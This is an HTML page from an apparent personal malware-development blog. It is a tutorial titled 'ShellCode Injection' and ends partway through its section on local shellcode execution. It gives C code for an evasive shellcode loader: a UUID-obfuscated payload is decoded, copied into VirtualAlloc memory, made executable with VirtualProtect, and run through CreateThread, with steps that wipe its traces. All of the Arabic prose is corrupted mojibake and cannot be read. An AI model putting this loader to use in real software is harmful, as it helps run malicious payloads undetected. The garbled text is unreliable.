<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShellCode Injection</title>
    <link rel="icon" href="../src/Pics/ShCdi.webp" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"
        crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
    <style>
        html,
        body {
            font-family: 'Cairo', sans-serif;
            margin: 0;
            padding: 0;
            background-color: black;
            overflow-x: hidden;
        }

        nav {
            width: 100%;
            height: 10vh;
            position: sticky;
        }

        .nav-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: space-around;
            align-items: center;
        }

        .logo {
            font-size: 2rem;
            font-weight: bold;
            cursor: pointer;
            background: -webkit-linear-gradient(gold, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .logo span {
            cursor: pointer;
            background: -webkit-linear-gradient(gold, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .hamburg,
        .cancel {
            cursor: pointer;
            position: absolute;
            right: 15px;
            top: 10px;
            color: gold;
            display: none;
            font-size: clamp(2.5rem, 0.5rem + 5vw, 3rem);
        }

        .nav-container .links {
            display: flex;
        }

        .nav-container .links a {
            font-size: 1.2rem;
            color: white;
            margin: 0 20px;
            text-decoration: none;
            font-weight: 550;
            transition: 0.3s linear;
        }

        .nav-container .links a:hover {
            color: gold;
            border-bottom: 2px solid gold;
        }

        .dropdown {
            max-height: 100vh;
            overflow-y: auto;
            z-index: 100;
            position: absolute;
            top: 0;
            transform: translateY(-500px);
            width: 100%;
            height: auto;
            backdrop-filter: blur(4px) brightness(40%);
            box-shadow: 0 0 20px black;
            transition: 0.2s linear;
        }

        .dropdown .links a {
            display: flex;
            color: white;
            text-decoration: none;
            padding: 15px 0;
            justify-content: center;
            align-items: center;
            transition: 0.2s linear;
        }

        .dropdown .links a:hover {
            background-color: gold;
            color: black;
        }

        .dark-mode {
            background-color: #222;
            color: #f4f4f4;
        }

        header {
            background: -webkit-linear-gradient(gold, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            border-bottom: 1px solid gold;
        }



        header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 0 15px;
        }


        .article {
            background: white;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .article h2 {
            margin-top: 0;
            border-top: 2px solid gold;
            border-bottom: 2px solid gold;
            padding-bottom: 5px;
        }

        .code-block {
            background: gold;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
            direction: ltr;
            text-align: left;
            font-size: 15px;
        }


        @media (max-width:884px) {
            nav .logo {
                position: absolute;
                top: 16px;
                left: 15px;
                font-size: 1.5rem;
            }

            .nav-container .links {
                display: none;
            }

            .hamburg,
            .cancel {
                display: block;
            }

        }


        @media (max-width:440px) {
            .nav-container {
                margin-top: 10px;
            }

            table {
                display: block;
                overflow-x: auto;
            }
        }

        .footer {
            background: #111;
            color: #fff;
            text-align: center;
            padding: 5px;
            position: relative;
            bottom: 0;
            width: 100%;
            margin-top: auto;
        }

        .footer a {
            color: gold;
            text-decoration: none;
            font-weight: bold;
        }

        .footer a:hover {
            color: #51460c;

        }

        .ltr {
            direction: ltr;
            text-align: left;
        }

        .article-image {
            width: 100%;
            height: auto;
            border-radius: 8px;
        }

        .nav-buttons a {
            background: gold;
            color: black;
            padding: 10px 0;
            border-radius: 5px;
            text-decoration: none;
            transition: background-color 0.3s;
            text-align: center;
            flex: 1;
            margin: 0 10px;
            max-width: 150px;
            font-size: 20px;
        }

        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }

        .nav-buttons a:hover {
            background: #51460c;
            color: #fff;
        }

        .download-link {
            text-decoration: none;
            color: gold;
            font-weight: bold;
            transition: color 0.3s ease;
        }

        .download-link:hover {
            color: #51460c;
            text-decoration: underline;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px auto;
            text-align: center;


        }

        th,
        td {
            border: 1px solid black;
            padding: 7px;
        }

        th {
            background-color: gold;
        }
    </style>
</head>

<body>
    <section>
        <nav>
            <div class="nav-container" style="direction: ltr;">
                <div class="logo" data-aos="zoom-in" data-aos-duration="800">
                    <span>0x4de1</span>
                </div>
                <div class="links">
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100"><a
                            href="https://0x4de1.github.io">Home</a></div>
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300"><a
                            href="../MalDev.html">Mal Dev</a></div>
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400"><a
                            href="https://0x4de1.medium.com/" id="blogLink">CTF Writeups</a></div>
                </div>
            </div>
            <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
            <div class="dropdown">
                <div class="links">
                    <a href="https://0x4de1.github.io">Home</a>
                    <a href="../MalDev.html">Mal Dev</a>
                    <a href="https://0x4de1.medium.com">CTF Writeups</a>
                    <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
                </div>
            </div>
        </nav>
        <header>
            <h1 id="article-title" style="direction: ltr;">ShellCode Injection</h1>
        </header>
        <div class="container">
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                <img src="../src/Pics/ShCdi.webp" alt="HomeLab" class="article-image" loading="lazy">
            </div>
            <div class="article" data-aos="zoom-in" data-aos-duration="800">
                <p style="text-align: center; font-weight: bold;">Ø§Ù„Ø³Ù‘ÙÙ„Ø§ÙÙ…Ù Ø¹ÙÙ„ÙÙŠÙ’ÙƒÙÙ…Ù’ ÙˆÙØ±ÙØ­Ù’Ù…ÙØ©Ù Ø§Ù„Ù„Ù‡Ù ÙˆÙØ¨ÙØ±ÙÙƒÙØ§ØªÙÙ‡Ù
                </p>
                <p style="text-align: center; font-weight: bold;">Ø§Ù„Ù„ÙÙ‘Ù‡ÙÙ…ÙÙ‘ ØµÙÙ„ÙÙ‘ Ø¹ÙÙ„ÙÙ‰ Ù…ÙØ­ÙÙ…ÙÙ‘Ø¯Ù ÙˆÙØ¹ÙÙ„ÙÙ‰ Ø¢Ù„Ù
                    Ù…ÙØ­ÙÙ…ÙÙ‘Ø¯ÙØŒ ÙƒÙÙ…ÙØ§ ØµÙÙ„ÙÙ‘ÙŠÙ’ØªÙ Ø¹ÙÙ„ÙÙ‰ Ø¥ÙØ¨Ù’Ø±ÙØ§Ù‡ÙÙŠÙ…Ù ÙˆÙØ¢Ù„Ù
                    Ø¥ÙØ¨Ù’Ø±ÙØ§Ù‡ÙÙŠÙ…ÙØŒ Ø¥ÙÙ†ÙÙ‘ÙƒÙ Ø­ÙÙ…ÙÙŠØ¯ÙŒ Ù…ÙØ¬ÙÙŠØ¯ÙŒØŒ ÙˆÙØ¨ÙØ§Ø±ÙÙƒÙ’ Ø¹ÙÙ„ÙÙ‰ Ù…ÙØ­ÙÙ…ÙÙ‘Ø¯Ù ÙˆÙØ¹ÙÙ„ÙÙ‰ Ø¢Ù„Ù Ù…ÙØ­ÙÙ…ÙÙ‘Ø¯ÙØŒ ÙƒÙÙ…ÙØ§
                    Ø¨ÙØ§Ø±ÙÙƒÙ’ØªÙ Ø¹ÙÙ„ÙÙ‰ Ø¥ÙØ¨Ù’Ø±ÙØ§Ù‡ÙÙŠÙ…Ù ÙˆÙØ¢Ù„Ù Ø¥ÙØ¨Ù’Ø±ÙØ§Ù‡ÙÙŠÙ…ÙØŒ Ø¥ÙÙ†ÙÙ‘ÙƒÙ Ø­ÙÙ…ÙÙŠØ¯ÙŒ Ù…ÙØ¬ÙÙŠØ¯ÙŒØŒ<br>
                    <br>
                    âœ¨ğŸŒ™ Ù‡ÙÙ„Ù‘Ù Ù‡ÙÙ„Ø§Ù„Ù Ø§Ù„Ø®ÙÙŠÙ’Ø±ÙØŒ ÙÙØ£Ø³Ø£Ù„Ù Ø§Ù„Ù„Ù‡Ù Ø£Ù†Ù’ ÙŠÙÙ…Ù„Ø£ Ù‚ÙÙ„ÙˆØ¨ÙÙƒÙ… Ø¨Ø§Ù„Ù†Ù‘ÙÙˆØ±Ù ÙˆØ§Ù„ÙŠÙ‚ÙŠÙ†ÙØŒ Ù…ÙØ¨ÙØ§Ø±ÙÙƒÙŒ Ø¹ÙÙ„ÙÙŠÙƒÙÙ…Ù
                    Ø§Ù„Ø´Ù‘ÙÙ‡Ù’Ø±Ù ğŸŒ™âœ¨
                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                    <img src="../src/Pics/Ramadan2.jpg" alt="HomeLab" class="article-image" loading="lazy">
                </div>
                </p>
            </div>
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                <h2>Introduction</h2>
                <p>[+] Ø¥ØªÙƒÙ„Ù…Ù†Ø§ ÙÙ€ Ø§Ù„Ù…Ù‚Ø§Ù„Ø© Ø§Ù„Ù„Ù€ ÙØ§ØªØª Ø¹Ù† Ø§Ù„Ù€ DLL Injection .. ÙÙŠ Ø§Ù„Ù…Ù‚Ø§Ù„Ø© Ø¯ÙŠ Ù‡Ù†ØªÙƒÙ„Ù… Ø¹Ù† Ù†ÙˆØ¹ ØªØ§Ù†ÙŠ Ù…Ù† Ø£Ù†ÙˆØ§Ø¹
                    Ø§Ù„Ù€ Process Injection ÙˆÙ‡Ùˆ Ø§Ù„Ù€ <code
                        style="background: gold; font-size: 14px;">Shellcode Injection</code>.</p>
                <p style="font-weight: bold;">[+] ÙˆÙ‡Ù†ØªÙƒÙ„Ù… ØªØ­Ø¯ÙŠØ¯Ø§ Ø¹Ù† :</p>
                <ol style="font-weight: bold; direction: ltr;">
                    <li>Local Shellcode Execution</li>
                    <li>Remote Shellcode Injection</li>
                </ol>
                <h2 style="direction: ltr;">1. Local Shellcode Execution</h2>
                <p>[+] ÙÙ€ Ø§Ù„Ù…Ù‚Ø§Ù„Ø§Øª Ø§Ù„Ù„Ù€ ÙØ§ØªØª ÙƒÙÙ†Ø§ Ø¨Ù†Ø³ØªØ®Ø¯Ù… Ø´ÙŠÙ„ ÙƒÙˆØ¯ Ø¨Ø³ÙŠØ· ÙˆØ¸ÙŠÙØªÙ‡ Ø¥Ù†Ù‡ ÙŠÙØªØ­ Ø§Ù„Ù€ Calculator ØŒ Ø¨Ø³ Ù…Ø¬Ø±Ø¨Ù†Ø§Ø´ Ù†Ø¯ÙŠÙ„Ù‡
                    Ø£Ù…Ø± Ø¹Ø´Ø§Ù† ÙŠØ´ØªØºÙ„ Ù‚Ø¨Ù„ ÙƒØ¯Ù‡ .. ÙÙ€ Ø§Ù„Ø¬Ø²Ø¡ Ø¯Ø§ Ø¨Ù‚ÙŠ Ù‡Ù†ØªÙƒÙ„Ù… Ø¹Ù† Ù„Ùˆ Ù…Ø¹Ø§Ù†Ø§ Ø´ÙŠÙ„ ÙƒÙˆØ¯ ØŒ Ø§Ø²Ø§ÙŠ Ù†Ù‚Ø¯Ø± Ù†Ø´ØºÙ„Ù‡. </p>
                <p style="font-weight: bold;">[+] Ø¨Ø³ Ù‚Ø¨Ù„ Ù…Ù€ Ù†Ø¯Ø®Ù„ Ø¹ Ø§Ù„ÙƒÙˆØ¯ ØŒ ØªØ¹Ø§Ù„ÙŠ Ø£ÙˆØ¶Ø­Ù„Ùƒ Ø¥Ø­Ù†Ø§ Ø±Ø§ÙŠØ­ÙŠÙ† Ù†Ø¹Ù…Ù„ Ø¥ÙŠÙ‡ :</p>
                <ol>
                    <li>Ù‡Ù†Ø¹Ù…Ù„ Obfuscation Ù„Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ØªÙˆÙ„ Ø§Ù„Ù€ <code
                            style="background: gold; font-size: 14px;">HellShell</code> Ø§Ù„Ù„Ù€ Ø§ØªÙƒÙ„Ù…Ù†Ø§ Ø¹Ù†Ù‡Ø§ Ù‚Ø¨Ù„ ÙƒØ¯Ù‡.
                    </li>
                    <li>Ù‡Ù†Ø­Ø¬Ø² Ù…ÙƒØ§Ù† ÙÙ€ Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code
                            style="background: gold; font-size: 14px;">VirtualAlloc</code> Ø¹Ù„Ø´Ø§Ù† Ù†Ø­Ø· ÙÙŠÙ‡ Ø§Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯.
                    </li>
                    <li>Ù‡Ù†Ø§Ø®Ø¯ ÙƒÙˆØ¨ÙŠ Ù…Ù† Ø§Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯ ÙˆÙ†Ø­Ø·Ù‡ ÙÙ€ Ø§Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ù„Ù€ Ø­Ø¬Ø²Ù†Ø§Ù‡ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code
                            style="background: gold; font-size: 14px;">memcpy</code>.</li>
                    <li>Ù‡Ù†ØºÙŠØ± ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø¹Ø´Ø§Ù† Ù†Ù‚Ø¯Ø± Ù†Ø¯ÙŠÙ„Ù‡ Ø£Ù…Ø± ÙŠØªÙ†ÙØ° Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code
                            style="background: gold; font-size: 14px;">VirtualProtect</code>.</li>
                    <li>Ù‡Ù†Ø´ØºÙ„ Ø§Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯ Ø¬ÙˆØ§ Ø«Ø±ÙŠØ¯ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code
                            style="background: gold; font-size: 14px;">CreateThread</code> Ø¹Ø´Ø§Ù† ÙŠØªÙ†ÙØ°.</li>
                </ol>
                <p style="font-weight: bold;">[+] ÙŠÙ„Ø§ Ø¨ÙŠÙ†Ø§ Ù†Ø´ÙˆÙ Ø§Ù„Ø®Ø·ÙˆØ§Øª :</p>
                <ol>
                    <li style="font-weight: bold;">Ù‡Ù†Ø±ÙˆØ­ Ù„Ù€ ØªÙˆÙ„ <code
                            style="background: gold; font-size: 14px;">HellShell</code> ÙˆÙ‡Ù†Ø¹Ù…Ù„ <code
                            style="background: gold; font-size: 14px;">Obfuscation</code> Ù„Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯ ÙˆÙ„Ø£ÙŠ Ø·Ø±ÙŠÙ‚Ø© ØªØ­Ø¨Ù‡Ø§
                        .. Ø§Ù†Ø§ Ø§Ø³ØªØ®Ø¯Ù…Øª UUIDs :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalShellcodeEx-1.png" alt="LocalShellcodeEx-1" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ù‡Ù†ÙƒØ±ÙŠØª Ø¨Ø±ÙˆØ¬ÙŠÙƒØª Ø¬Ø¯ÙŠØ¯ ØŒ ÙˆÙ‡Ù†Ø¶ÙŠÙ Ø§Ù„Ù€ Output Ø§Ù„Ù„Ù€ Ø·Ù„Ø¹ Ù…Ù† Ø§Ù„ØªÙˆÙ„ :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalShellcodeEx-2.png" alt="LocalShellcodeEx-2" class="article-image"
                            loading="lazy">
                    </div>
                    <li style="font-weight: bold;">Ù‡Ù†Ø¯Ø®Ù„ Ø¹ Ø§Ù„Ù€ main func ØŒ ÙˆØ£ÙˆÙ„ Ø­Ø§Ø¬Ù‡ Ù‡Ù†Ø¬Ù‡Ø² Ø§Ù„Ù€ variables ÙˆÙ‡Ù†Ø³ØªØ¯Ø¹ÙŠ
                        Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨ØªØ§Ø¹Ø© Ø§Ù„Ù€
                        Deobfuscation :</li>
                    <div class="code-block"><code>    PBYTE pDeobfuscatedPayload = NULL;<br>
                            SIZE_T sDeobfuscatedSize = 0;<br>
                            DWORD dwOldProtection = 0;<br><br>
                        
                            if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {<br>
                                &nbsp;&nbsp;return -1;<br>
                            }</code></div>
                    <li style="font-weight: bold;">Ù‡Ù†Ø³ØªØ®Ø¯Ù… <code
                            style="background: gold; font-size: 14px;">VirtualAlloc</code> Ø¹Ø´Ø§Ù† Ù†Ø­Ø¬Ø² Ù…ÙƒØ§Ù† ÙÙ€ Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ
                        .. ÙˆØªÙ‚Ø¯Ø± ØªØ´ÙˆÙ Ø§Ù„Ù€
                        Documentation Ø¨ØªØ§Ø¹Ù‡Ø§ Ù…Ù† <a
                            href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc"
                            target="_blank" class="download-link">[Ù‡Ù†Ø§]</a>.</li>
                    ÙˆØ§Ù„ÙÙƒØ±Ø© Ø§Ù†Ù‡ Ø¨ÙŠØ­Ø¬Ø² Ù…Ø³Ø§Ø­Ø© ÙÙŠ Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø¨Ø­Ø¬Ù… Ø§Ù„Ù€ Shellcode Ø¨Ø¹Ø¯ ÙÙƒ Ø§Ù„ØªØ´ÙÙŠØ± ØŒ ÙˆØ¨ÙŠØ­Ø¯Ø¯ Ù„Ù‡Ø§ Ø§Ù„Ù€ Protection
                    Flags Ø¹Ù„Ù‰ Ø¥Ù†Ù‡Ø§ <code style="background: gold; font-size: 14px;">PAGE_READWRITE</code> ÙŠØ¹Ù†ÙŠ
                    ØµÙ„Ø§Ø­ÙŠØ§Øª Ù‚Ø±Ø§Ø¡Ø© ÙˆÙƒØªØ§Ø¨Ø© Ø¨Ø³ (Ù‡Ù†ØºÙŠØ± Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ø¨Ø¹Ø¯ÙŠÙ†).

                    <div class="code-block"><code>    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
                        if (pShellcodeAddress == NULL) {<br>
                            &nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);<br>
                            &nbsp;&nbsp;return -1;<br>
                        }</code></div>
                    <li style="font-weight: bold;">Ù‡Ù†Ù†Ù‚Ù„ Ø§Ù„Ø´ÙŠÙ„ ÙƒÙˆØ¯ Ù„Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ù„Ù€ Ø­Ø¬Ø²Ù†Ø§Ù‡ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù€ <code
                            style="background: gold; font-size: 14px;">memcpy</code> :</li>
                    Ø¨ØªØ§Ø®Ø¯ <code style="background: gold; font-size: 14px;">pDeobfuscatedPayload</code> (Ø§Ù„Ù€ Shellcode
                    Ø¨Ø¹Ø¯ ÙÙƒ Ø§Ù„ØªØ´ÙÙŠØ±) ÙˆØ¨ÙŠØ­Ø·Ù‡ ÙÙ€ Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© Ø§Ù„Ù„Ù€ Ø­Ø¬Ø²Ù†Ø§Ù‡Ø§ ÙÙ€
                    Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø¹Ù†Ø¯ <code style="background: gold; font-size: 14px;">pShellcodeAddress</code>.
                    <div class="code-block"><code> memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
                    </code></div>
                    Ø¨Ø¹Ø¯ÙŠÙ† Ù‡Ù†Ø³ØªØ®Ø¯Ù… memset ÙˆØ¯ÙŠ Ø¨ØªØ¹Ù…Ù„ Wipe Ù„Ù„Ù€ <code
                        style="background: gold; font-size: 14px;">pDeobfuscatedPayload</code> Ø¹Ù† Ø·Ø±ÙŠÙ‚ Ù…Ù„Ø¡ Ø§Ù„Ù…Ø³Ø§Ø­Ø©
                    Ø¨ØªØ§Ø¹ØªÙ‡ Ø¨Ø£ØµÙØ§Ø± ØŒ ÙˆØ¯Ù‡
                    Ø¹Ø´Ø§Ù† Ù†Ù…Ù†Ø¹ Ø£ÙŠ Ø£Ø«Ø± Ù„ÙŠÙ‡ ÙÙ€ Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ ØŒ ÙˆÙ…ÙŠÙØ¶Ù„Ø´ Ù…ØªØ§Ø­ Ù„Ø­Ø¯ ØªØ§Ù†ÙŠ ÙŠÙ‚Ø±Ø£Ù‡.
                    <div class="code-block"><code>memset(pDeobfuscatedPayload, 0, sDeobfuscatedSize);</code></div>
                    Ø¨Ø¹Ø¯ Ù…Ø§ Ù†Ù‚Ù„Ù†Ø§ Ø§Ù„Ù€ Shellcode Ù„Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ø¬Ø¯ÙŠØ¯ Ù…Ø¹ØªØ´ ÙÙŠÙ‡ Ù„Ø§Ø²Ù…Ø© Ù„Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø§Ù„Ù„Ù€ ÙƒØ§Ù†Øª Ù…Ø®Ø²Ù†Ø§Ù‡ ØŒ ÙØ¨Ù†Ù…Ø³Ø­Ù‡Ø§ Ù…Ù† Ø§Ù„Ù€
                    Heap Ø¹Ø´Ø§Ù† Ù†Ù…Ù†Ø¹ Ø£ÙŠ Memory Leak.
                    <div class="code-block"><code>    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
                    </code></div>
                    <li style="font-weight: bold;">Ù‡Ù†ØºÙŠØ±ÙÙ€ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø¹Ø´Ø§Ù† Ù†Ù‚Ø¯Ø± Ù†Ù†ÙØ° Ø§Ù„Ù€ Shellcode Ø¨Ø¹Ø¯ Ù…Ø§ Ø®Ø²Ù†Ø§Ù‡
                        Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù€ <code style="background: gold; font-size: 14px;">VirtualProtect</code> :</li>
                    Ø¨ØªØ§Ø®Ø¯ Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù€ <code style="background: gold; font-size: 14px;">Shellcode pShellcodeAddress</code>
                    ÙˆØ¨ÙŠØºÙŠØ±
                    Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ø¨ØªØ§Ø¹ØªÙ‡ Ù„Ù€ <code style="background: gold; font-size: 14px;">PAGE_EXECUTE_READWRITE</code> ØŒ
                    ÙˆØ¯Ù‡
                    Ù…Ø¹Ù†Ø§Ù‡ Ø¥Ù† Ø§Ù„Ù…Ø³Ø§Ø­Ø© Ø¯ÙŠ Ù…Ù† Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø¨Ù‚Øª Ù…Ù…ÙƒÙ† Ù†Ù‚Ø±Ø§Ù‡Ø§ ØŒ Ù†ÙƒØªØ¨ ÙÙŠÙ‡Ø§ ØŒ ÙˆÙƒÙ…Ø§Ù† Ù†Ù†ÙØ° Ø£ÙŠ ÙƒÙˆØ¯ Ø¬ÙˆØ§Ù‡Ø§ (ÙˆØ¯Ù‡ Ø¶Ø±ÙˆØ±ÙŠ
                    Ø¹Ø´Ø§Ù† Ù†Ù‚Ø¯Ø± Ù†Ø´ØºÙ„ Ø§Ù„Ù€ Shellcode) .. ÙˆØ¨ØªØ®Ø²Ù† Ø§Ù„Ù‚ÙŠÙ…Ù‡ Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© Ù„Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª ÙÙŠ <code
                        style="background: gold; font-size: 14px;">dwOldProtection</code> Ø¹Ø´Ø§Ù† Ù„Ùˆ Ø¹Ø§ÙˆØ²ÙŠÙ†
                    Ù†Ø±Ø¬Ø¹Ù‡Ø§ ØªØ§Ù†ÙŠ Ø¨Ø¹Ø¯ÙŠÙ†.
                    <div class="code-block"><code>    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
                        &nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
                        &nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
                        &nbsp;&nbsp;return -1;<br>
                    }</code></div>
                    <li style="font-weight: bold;">Ù‡Ù†Ø¹Ù…Ù„ Thread Ø¬Ø¯ÙŠØ¯ Ø¹Ø´Ø§Ù† ÙŠØ´ØºÙ„ Ø§Ù„Ù€ Shellcode Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù€ <code
                            style="background: gold; font-size: 14px;">CreateThread</code> :
                    </li>
                    Ø§Ù„Ø¨Ø§Ø±Ø§Ù…ØªØ± <code
                        style="background: gold; font-size: 14px;">(LPTHREAD_START_ROUTINE)pShellcodeAddress</code>
                    Ø¨ÙŠØ­Ø¯Ø¯ Ø¥Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù„Ù€ Ù‡ÙŠØ¨Ø¯Ø£ ØªÙ†ÙÙŠØ° Ø§Ù„Ù€ <code style="background: gold; font-size: 14px;">Thread</code>
                    Ù‡Ùˆ
                    Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯ ÙÙ€ <code style="background: gold; font-size: 14px;">pShellcodeAddress</code> ØŒ ÙˆØ¯Ù‡ ÙØ¹Ù„ÙŠØ§
                    Ø¨ÙŠØ´ØºÙ„ Ø§Ù„Ù€ Shellcode .. Ø¨Ù‚ÙŠØ© Ø§Ù„Ø¨Ø§Ø±Ø§Ù…ØªØ±Ø² Ù…Ø´ Ù…Ø³ØªØ®Ø¯Ù…Ù‡ Ù‡Ù†Ø§ ØºÙŠØ±
                    Ø¢Ø®Ø± ÙˆØ§Ø­Ø¯ Ø§Ù„Ù€ Ø¨ÙŠØ®Ø²Ù† <code style="background: gold; font-size: 14px;">threadID</code> Ø¹Ø´Ø§Ù† Ù†Ù‚Ø¯Ø±
                    Ù†Ø¹Ø±Ù Ø§Ù„Ù€ ID Ø¨ØªØ§Ø¹ Ø§Ù„Ù€ Thread Ø§Ù„Ø¬Ø¯ÙŠØ¯.
                    <div class="code-block"><code>    DWORD threadID;<br>
                        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, &threadID);<br>
                        if (hThread == NULL) {<br>
                            &nbsp;&nbsp;VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
                            &nbsp;&nbsp;return -1;<br>
                        }</code></div>
                    <li style="font-weight: bold;">Ø¢Ø®Ø± Ø®Ø·ÙˆØ© ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ù€ Resources Ø¨Ø¹Ø¯ ØªØ´ØºÙŠÙ„ Ø§Ù„Ù€ Shellcode :</li>
                    Ø¨Ø¹Ø¯ Ù…Ù€ Ø§Ù„Ù€ Shellcode ÙŠØ´ØªØºÙ„ Ù„Ø§Ø²Ù… Ù†Ù†Ø¶Ù ÙˆØ±Ø§Ù‡ Ø¹Ø´Ø§Ù† Ù…Ù†Ø³Ø¨Ø´ Ø£ÙŠ Ù…ÙˆØ§Ø±Ø¯ Ù…ÙØªÙˆØ­Ø© .. Ø¨Ù†Ø³ØªÙ†Ù‰ Ø§Ù„Ù€ Thread ÙŠØ®Ù„Øµ Ø´ØºÙ„Ù‡
                    Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… <code style="background: gold; font-size: 14px;">WaitForSingleObject</code> ØŒ ÙˆØ¨Ø¹Ø¯Ù‡Ø§
                    Ø¨Ù†Ù…Ø³Ø­ Ø§Ù„Ù…ÙŠÙ…ÙˆØ±ÙŠ Ø§Ù„Ù„Ù€ ÙƒÙ†Ø§ Ø­Ø¬Ø²Ù†Ø§Ù‡Ø§ Ø¨Ù€ <code
                        style="background: gold; font-size: 14px;">VirtualAlloc</code> Ø¹Ù† Ø·Ø±ÙŠÙ‚
                    <code style="background: gold; font-size: 14px;">VirtualFree</code> ØŒ ÙˆØ£Ø®ÙŠØ±Ø§ Ø¨Ù†Ù‚ÙÙ„ Ø§Ù„Ù€ Thread Ø¨Ù€
                    <code style="background: gold; font-size: 14px;">CloseHandle</code> Ø¹Ø´Ø§Ù† Ù†ØªÙØ§Ø¯Ù‰ Ø§Ù„Ù€ Memory Leaks
                    ÙˆØ£ÙŠ Ù…Ø´Ø§ÙƒÙ„ Ù…Ù…ÙƒÙ†
                    ØªØ£Ø«Ø± Ø¹Ù„Ù‰ Ø£Ø¯Ø§Ø¡ Ø§Ù„Ø³ÙŠØ³ØªÙ….
                    <div class="code-block"><code>    WaitForSingleObject(hThread, INFINITE);<br>
                        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);<br>
                        CloseHandle(hThread);</code></div>
                </ol>
                <p style="border-top: 2px solid gold;"></p>
                <p style="font-weight: bold;">[+] ÙŠÙ„Ø§ Ù†Ù€ Ø±Ù† :</p>
                <ul>
